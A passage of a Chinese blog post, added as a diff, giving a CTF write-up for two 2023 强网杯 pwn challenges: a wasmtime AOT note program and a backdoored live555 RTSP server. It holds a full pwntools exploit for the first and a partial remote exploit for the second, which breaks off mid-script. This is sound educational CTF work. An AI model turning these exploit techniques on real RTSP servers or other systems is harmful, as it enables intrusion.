@@ -1,0 +1,767 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="最自闭的一场 只写了比赛的时候没做出来的，解数比较多的两道">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 强网杯线上赛 pwn wp">
+<meta property="og:url" content="http://akaieurus.github.io/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="最自闭的一场 只写了比赛的时候没做出来的，解数比较多的两道">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc4.jpg">
+<meta property="article:published_time" content="2024-01-25T03:40:12.000Z">
+<meta property="article:modified_time" content="2025-01-03T11:06:15.947Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc4.jpg">
+  
+  
+  
+  <title>2023 强网杯线上赛 pwn wp - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc4.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023 强网杯线上赛 pwn wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-25 11:40" pubdate>
+          2024年1月25日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023 强网杯线上赛 pwn wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>最自闭的一场</p>
+<p>只写了比赛的时候没做出来的，解数比较多的两道</p>
+<span id="more"></span>
+
+<h1 id="wtoa"><a href="#wtoa" class="headerlink" title="wtoa"></a>wtoa</h1><p>wasmtime Ahead-Of-Time（AOT）预编译WASM源码生成的JIT代码</p>
+<p>里面本质还是可执行的机器码，经调试发现大概是wasmtime会调用wtoa里的代码，wtoa又会调用wasmtime的一些接口用于输入输出之类的</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/vmmapwtoa.png" srcset="/img/loading.gif" lazyload class title="vmmapwtoa">
+
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt1.png" srcset="/img/loading.gif" lazyload class title="bt1">
+
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/bt2.png" srcset="/img/loading.gif" lazyload class title="bt2">
+
+<h2 id="逆向-amp-调试"><a href="#逆向-amp-调试" class="headerlink" title="逆向 &amp; 调试"></a>逆向 &amp; 调试</h2><p>学到一个新操作，IDA View-&gt;Graphs-&gt;Function Calls能看函数调用图，由于这个题看着像个菜单</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/wtoa.png" srcset="/img/loading.gif" lazyload class title="wtoa">
+
+<p>这个函数看着像菜单的起点（也确实是），康康</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/graph.png" srcset="/img/loading.gif" lazyload class title="graph">
+
+<p><em>ps：其实比赛的时候夏爹已经逆到这了，tql！</em></p>
+<p>先看看程序的功能</p>
+<ul>
+<li><p>Add</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/add.png" srcset="/img/loading.gif" lazyload class title="add">
+</li>
+<li><p>Edit</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/edit.png" srcset="/img/loading.gif" lazyload class title="edit">
+</li>
+<li><p>Delete</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/delete.png" srcset="/img/loading.gif" lazyload class title="delete">
+</li>
+<li><p>Show</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/show.png" srcset="/img/loading.gif" lazyload class title="show"></li>
+</ul>
+<p>浅浅调试一下，<strong>IDA内的地址是gdb的相对地址+0x1000</strong></p>
+<p>这个应该是输入的地方</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/input.png" srcset="/img/loading.gif" lazyload class title="input">
+
+<ul>
+<li>v5：rbx</li>
+<li>v4：r15</li>
+</ul>
+<p>应该是只取输入的两字节，进行操作的判断，然后就是各个功能对应的函数</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aaa.png" srcset="/img/loading.gif" lazyload class title="aaa">
+
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/aa.png" srcset="/img/loading.gif" lazyload class title="aa">
+
+<p>可以看出我们想要的flag就在下面</p>
+<p>反编译可以看出寻址都是按基址+段内偏移进行的，堆块的管理大概是这样的↓</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/chunk.png" srcset="/img/loading.gif" lazyload class title="chunk">
+
+<p>edit中有个后门，length为3428913的时候可以将当前堆块的内容扩写为48字节</p>
+<p>当add两个note的时候note1的chunk就在note0的data上面，直接将note1-&gt;buffer指向flag，size改大再show note1就行</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/tele.png" srcset="/img/loading.gif" lazyload class title="tele">
+
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27; &gt; &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx,offset,length</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;S&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;offset&#x27;</span>,<span class="hljs-built_in">str</span>(offset).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;length&#x27;</span>,<span class="hljs-built_in">str</span>(length).encode())<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,offset,data,length</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;offset&#x27;</span>,<span class="hljs-built_in">str</span>(offset).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;length&#x27;</span>,<span class="hljs-built_in">str</span>(length).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27; &gt; &#x27;</span>,data)<br><br>p=process(<span class="hljs-string">&#x27;./launch.sh&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0x1300000000</span>)+p64(<span class="hljs-number">0x00501cd800501ca0</span>)+p64(<span class="hljs-number">0x1b00000000</span>)+p64(<span class="hljs-number">0x501b40</span>)+p64(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,payload,<span class="hljs-number">3428913</span>)<br>show(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="rtsp"><a href="#rtsp" class="headerlink" title="rtsp"></a>rtsp</h1><p>非常好中文路径~~~&#x2F;&#x2F;&#x2F;(^v^)\\\~~~</p>
+<h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><ul>
+<li><p>没开canary</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/checksec.png" srcset="/img/loading.gif" lazyload class title="checksec">
+</li>
+<li><p>字符串大法好，live555开源库，源码get √</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">.rodata:0000000000081CE3	00000018	C	LIVE555 Streaming Media<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>rtsp协议类似http，有各种方法如SETUP，GET_PARAMERTER，PAUSE等，一个报文类似这样👇</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">GET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0<br>Session: 3E1B7756<br>CSeq: 1<br>GET_INFO: 2023<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="各种后门"><a href="#各种后门" class="headerlink" title="各种后门"></a>各种后门</h2><ul>
+<li><p>有源码所以可以编一个bindiff，猜测会在各个方法的处理函数里进行改动，所以滤一波handleCmd（这个思路挺牛逼的）</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/handlecmd.png" srcset="/img/loading.gif" lazyload class title="handlecmd">
+</li>
+<li><p>或者字符串中也能看到一些奇怪的字符串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">.rodata:000000000007B39B	0000001C	C	100 maybe you need this %p\n<br>.rodata:000000000007B3C8	00000022	C	100 you may want to get more flag<br>.rodata:000000000007B40B	0000000C	C	vul_string:<br><br>.rodata:000000000007B3F9 aQwb            db &#x27;qwb&#x27;,0 <br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>一共三个后门</p>
+<ul>
+<li><p>handleCmd_GET_PARAMETER获取一个程序地址</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor1.png" srcset="/img/loading.gif" lazyload class title="backdoor1">
+</li>
+<li><p>handleCmd_SET_PARAMETER可以设置一个标志位</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor2.png" srcset="/img/loading.gif" lazyload class title="backdoor2">
+</li>
+<li><p>handleCmd_DESCRIBE设置标志位后存在溢出</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/backdoor3.png" srcset="/img/loading.gif" lazyload class title="backdoor3"></li>
+</ul>
+<h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><ul>
+<li><p>wavAudioTest相关的操作要先SETUP</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/session.png" srcset="/img/loading.gif" lazyload class title="session">
+</li>
+<li><p>GET_PARAMETER如果是对wavAudioTest操作实际调用的不是RTSPClientConnection对象的handleCmd_GET_PARAMETER而不是RTSPClientSession对象的</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/client.png" srcset="/img/loading.gif" lazyload class title="client">
+
+<p>分别调用两个函数的调用栈</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientconnection.png" srcset="/img/loading.gif" lazyload class title="clientconnection">
+
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/clientsession.png" srcset="/img/loading.gif" lazyload class title="clientsession">
+
+<p>判断在handleRequestBytes函数中</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp">     <span class="hljs-keyword">if</span> (urlIsRTSPS != fOurRTSPServer.fOurConnectionsUseTLS) &#123;<br>         <br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;OPTIONS&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>  <br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (urlPreSuffix[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span> &amp;&amp; urlSuffix[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; urlSuffix[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br><span class="hljs-comment">// The special &quot;*&quot; URL means: an operation on the entire server.  This works only for GET_PARAMETER and SET_PARAMETER:</span><br>           <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;GET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>             <span class="hljs-built_in">handleCmd_GET_PARAMETER</span>((<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer); <span class="hljs-comment">// RTSPClientConnection对象</span><br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;SET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>             <span class="hljs-built_in">handleCmd_SET_PARAMETER</span>((<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>             <span class="hljs-built_in">handleCmd_notSupported</span>();<br>           &#125;<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;DESCRIBE&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">handleCmd_DESCRIBE</span>(urlPreSuffix, urlSuffix, (<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer);<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;SETUP&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>  <br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;TEARDOWN&quot;</span>) == <span class="hljs-number">0</span><br>	 || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;PLAY&quot;</span>) == <span class="hljs-number">0</span><br>	 || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;PAUSE&quot;</span>) == <span class="hljs-number">0</span><br>	 || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;GET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span><br>	 || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;SET_PARAMETER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-keyword">if</span> (clientSession != <span class="hljs-literal">NULL</span>) &#123;<br>             clientSession-&gt;<span class="hljs-built_in">handleCmd_withinSession</span>(<span class="hljs-keyword">this</span>, cmdName, urlPreSuffix, urlSuffix, (<span class="hljs-type">char</span> <span class="hljs-type">const</span>*)fRequestBuffer); <span class="hljs-comment">// RTSPClientSession对象</span><br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>             <span class="hljs-built_in">handleCmd_sessionNotFound</span>();<br>           &#125;<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;REGISTER&quot;</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(cmdName, <span class="hljs-string">&quot;DEREGISTER&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>  <br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>  <br>     &#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>DESCRIBE方法只能对wavAudioTest操作</p>
+<img src="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/describe.png" srcset="/img/loading.gif" lazyload class title="describe"></li>
+</ul>
+<h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;192.168.111.143&#x27;</span>,<span class="hljs-number">8554</span>)<br>shellcode=<span class="hljs-string">b&#x27;SETUP rtsp://192.168.111.143:8554/wavAudioTest RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Session: &#x27;</span>)<br>session=p.recvuntil(<span class="hljs-string">b&#x27;;&#x27;</span>)[:-<span class="hljs-number">1</span>]<br><br>shellcode=<span class="hljs-string">b&#x27;GET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;Session: &#x27;</span>+session+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;CSeq: 1\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;GET_INFO: 2023\r\n\r\n&#x27;</span><br>p.send(shellcode)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;100 maybe you need this 0x&#x27;</span>)<br>codebase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x2A9990</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(codebase))<br><br>shellcode=<span class="hljs-string">b&#x27;SET_PARAMETER rtsp://192.168.111.143:8554/* RTSP/1.0\r\n&#x27;</span><br>shellcode+=<span class="hljs-string">b&#x27;Session: 